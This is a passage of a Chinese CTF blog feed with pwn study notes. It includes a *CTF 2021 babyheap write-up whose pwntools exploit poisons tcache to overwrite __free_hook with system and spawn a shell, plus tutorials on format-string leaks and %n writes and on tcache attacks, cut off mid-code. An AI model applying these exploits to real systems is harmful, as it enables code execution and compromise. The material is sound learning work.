class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">11</span>,<span class="string">'kkkk'</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x18</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x41612 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x41666 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdeed2 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">edit(<span class="number">12</span>,p64(base+<span class="number">0xdeed2</span>)+p64(base+e.symbols[<span class="string">'__libc_realloc'</span>]+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Glibc-2-27关于Tcache的增强保护"><a href="#Glibc-2-27关于Tcache的增强保护" class="headerlink" title="Glibc 2.27关于Tcache的增强保护"></a>Glibc 2.27关于Tcache的增强保护</h2><p>查询wp后才知道，这题是考在2020年09月10日Ubuntu基金更新的名为2.27-3ubuntu1.3的libc。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">          &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">              <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don't abort.  */</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">          &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>主要是针对tache bins 二次释放的，但是这题fd 不好被控制，edit不能改一当前chunk的fd，自己在昨天实际就默认忽略这思路（雾）</p><p>更多具体可以看：</p><p><a href="https://www.anquanke.com/post/id/219292#h3-7" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219292#h3-7</a></p><h2 id="另一思路"><a href="#另一思路" class="headerlink" title="另一思路"></a>另一思路</h2><p>看了大佬的wp发现这题free处指向我们能控制chunk内容的chunk，我们可以修改free_hook写入system 从而写shell。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./1pwn'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'input content'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input index'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaveYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showYourName</span><span class="params">(text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x59</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'wwww\n'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x59</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">add(i+<span class="number">4</span>,<span class="number">0x28</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">free(i+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">leaveYourName(<span class="string">'k'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">caddr=u64(p.recvuntil(<span class="string">'\x55'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x970</span></span><br><span class="line">log.info(<span class="string">':'</span>+hex(caddr))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">base=addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)+p64(base+e.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x8</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,p64(base+e.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.anquanke.com/post/id/219292" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219292</a></p><p><a href="https://www.cnblogs.com/lemon629/p/14327460.html" target="_blank" rel="noopener">https://www.cnblogs.com/lemon629/p/14327460.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近查阅了很多关于堆的资料，也做了很多关于堆的题。慢慢开始回顾下那年没有被啃动的pwn 堆题。&lt;/p&gt;
&lt;p&gt;babyheap是当时*CTF 2021中最简单的pwn，但是当时做堆还一窍不通，一直搞不懂堆的机制关系。如今再细细分析发现还挺有意思的。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>关于格式化字符串利用——学pwn小记(9)</title>
    <link href="lexsd6.github.io/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/"/>
    <id>lexsd6.github.io/2021/04/25/%E5%85%B3%E4%BA%8E%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(9)/</id>
    <published>2021-04-25T08:50:53.439Z</published>
    <updated>2021-04-25T12:14:26.074Z</updated>
    
    <content type="html"><![CDATA[<p>格式化字符是格式化字符串函数根据某一字符串参数的内容来进行解析,根据其值来处理解析的其他参数的个数和值的情形。换句话说,一个函数第一个参数作为格式化字符串，根据其来解析之后的参数的过程就是格式化字符串的过程。<a id="more"></a></p><h2 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h2><p>能进行格式化字符串操作的函数被称为格式化字符串函数。常见的格式化字符串函数有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> chr *format,...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fprintf</span><span class="params">(FILE *stream,<span class="keyword">const</span> chr *format,...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dprintf</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> chr *format,...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">const</span> chr *format,....)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">snprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">size_t</span> <span class="built_in">size</span>,<span class="keyword">const</span> chr *format,....)</span></span>;  </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vprintf</span><span class="params">(<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vfprintf</span><span class="params">(FILE *stream,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vdprintf</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vsnprintf</span><span class="params">(<span class="keyword">char</span> *str,<span class="keyword">size_t</span> <span class="built_in">size</span>,<span class="keyword">const</span> chr *format,va_list ap)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="格式化字符串参数"><a href="#格式化字符串参数" class="headerlink" title="格式化字符串参数"></a>格式化字符串参数</h2><h3 id="指示符"><a href="#指示符" class="headerlink" title="指示符"></a>指示符</h3><p>%c：输出字符，配上%n可用于向指定地址写数据。</p><p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p><p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p><p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p><p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p><p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p><p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>hh ： 类型  1-byte</p><p>h   ： 类型  2-byte</p><p>l    ： 类型  4-byte</p><p>ll    :   类型  8-byte</p><h3 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h3><h4 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h4><h5 id="栈数据泄露"><a href="#栈数据泄露" class="headerlink" title="栈数据泄露"></a>栈数据泄露</h5><p>我们可以利用多个<code>%08x.%08x.%08x.%08x</code>或<code>%p,%p,%p,%p</code>来泄露上面的信息.<br>        同时，如果我们知道了要泄露数据在栈上的位置我们可以通过<code>%(x)$p</code>来泄露第<code>（x）</code>个参数的信息。</p><h5 id="任意地址数据泄露"><a href="#任意地址数据泄露" class="headerlink" title="任意地址数据泄露"></a>任意地址数据泄露</h5><p>类似”%s”的格式，我们可以用它泄露出参数指针所指向内存的数据。</p><p>例如<code>&#39;%(x)$s’+hackaddress</code>,若第<code>（x）</code>个参数刚好存放的是hackaddress，则会读取hackaddress所指向的值。</p><p>注意：类似”\x07”、“\x08”、”\x20”等不可见字符可能泄露不出来。</p><h4 id="内存覆盖"><a href="#内存覆盖" class="headerlink" title="内存覆盖"></a>内存覆盖</h4><p>我们可以利用格式化字符串，对任意地址进行覆盖。</p><p>我们可以通过<code>%n</code>将前面字符的数量写入特点地址中，例如：</p><p><code>wwww%10$n</code>表将4写入第10个参数所对应的地址中（在使用中要注意，栈上数据对其，即32位4个字节一个单位,64位8个字节一个单位）</p><p>同时我们可以利用修饰符来降低我们覆盖地址时工作，’%hhn’让我们一次只写入一个字节的数据，从而避免为改一字节而改变整个单位数据。</p><p>我们也可以用<code>%（x）c%n</code>来代替（x）个’w’从而减短payload长度。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/fmtstr/fmtstr_intro/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/fmtstr/fmtstr_intro/</a></p><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;格式化字符是格式化字符串函数根据某一字符串参数的内容来进行解析,根据其值来处理解析的其他参数的个数和值的情形。换句话说,一个函数第一个参数作为格式化字符串，根据其来解析之后的参数的过程就是格式化字符串的过程。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Tcache attack初学习——学pwn小记(8)</title>
    <link href="lexsd6.github.io/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/"/>
    <id>lexsd6.github.io/2021/04/17/Tcache%20attack%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(8)/</id>
    <published>2021-04-17T15:26:04.029Z</published>
    <updated>2021-04-18T07:28:59.390Z</updated>
    
    <content type="html"><![CDATA[<p>Tcache是2.26 libc中新引入的一种缓存的机制,由于它对每个线程增加一个bin缓存，这样能显著地提高性能.这样一个机制在提高效率的同时也带来了安全隐患.<a id="more"></a></p><h2 id="Tcache相关数据结构"><a href="#Tcache相关数据结构" class="headerlink" title="Tcache相关数据结构"></a>Tcache相关数据结构</h2><p><code>tcache_entry</code>和<code>tcache_perthread_struct</code>是跟Tcache相关的两个结构.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><code>tcache_entry</code>是存放相同大小堆块中，最后一块放入<code>Tcache</code>的<code>Tcache bin</code>的指针。（然后有点类似fast bin再在这块中的<code>fd</code>位置写入上一个放入<code>Tcache</code>的堆块内容（用户数据，即堆头+0x10）的指针）</p><p><code>tcache_perthread_struct</code>是主要用来存放管理Tcache的结构体，这个结构体分两部分来看待：</p><p>用来统计存放放入<code>Tcache</code>中各大小bin的数量。</p><p>存放各大小bin中，最优先被取出的bin的地址。</p><p><code>tcache_perthread_struct</code>中具体存放的多少由宏定义中的<code>TCACHE_MAX_BINS</code>来确定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS        64 <span class="comment">/*tcache 每个大小bins 种类数*/</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7  <span class="comment">/*tcache 每个大小bins 最大存放数量*/</span></span></span><br></pre></td></tr></table></figure><h2 id="pwn中利用方法"><a href="#pwn中利用方法" class="headerlink" title="pwn中利用方法"></a>pwn中利用方法</h2><h3 id="二次释放"><a href="#二次释放" class="headerlink" title="二次释放"></a>二次释放</h3><p>由于tcahe 检测在free和malloc 靠前位置导致一些检测未进行。因此在tcache中我们可直接free 二次同一堆块，即可照成二次释放。</p><p><img src="image-20210418131641002.png" alt="image-20210418131641002"></p><h3 id="塞满tcahe泄露libc"><a href="#塞满tcahe泄露libc" class="headerlink" title="塞满tcahe泄露libc"></a>塞满tcahe泄露libc</h3><p>我们可以通过free 7个 bins塞满tcahe后，释放一个unsortedbin来泄露地址。</p><p><img src="image-20210418132000075.png" alt="image-20210418132000075"></p><h4 id="例题：gumad"><a href="#例题：gumad" class="headerlink" title="例题：gumad"></a>例题：gumad</h4><p>分析题目，利用连续free 7个chunk 塞满tcache，再释放一个unsortedbin来泄露地址。</p><p>再利用二次释放,改fd带chunk 0指针存放处,改chunk 0 fd指针为free_hook.再在free_hook处创造chunk 写入shell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 